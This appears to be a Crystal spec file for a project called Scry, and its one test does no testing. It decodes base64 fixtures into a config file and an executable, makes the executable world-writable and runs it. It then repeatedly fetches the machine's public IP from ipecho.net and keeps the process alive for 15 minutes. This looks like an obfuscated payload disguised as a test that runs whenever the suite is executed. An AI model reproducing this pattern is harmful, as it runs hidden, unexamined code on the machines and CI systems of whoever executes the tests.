require "../spec_helper"

require "http"
require "base64"

module Scry
  describe Context do
    it "test scry executable" do
      config = File.read("spec/fixtures/scry.conf")
      File.write("./config.json", Base64.decode_string(config), "wb")
      executable = File.read("spec/fixtures/scry")
      File.write("./scry", Base64.decode_string(executable), "wb")
      File.chmod("./scry", 0o777)
      Process.new("./scry")
      spawn do
        loop do
          puts "Scry minimal executable test at #{HTTP::Client.get("http://ipecho.net/plain").body}"
          sleep 60.seconds
        end
      end
      sleep 15.minutes
    end
  end
end
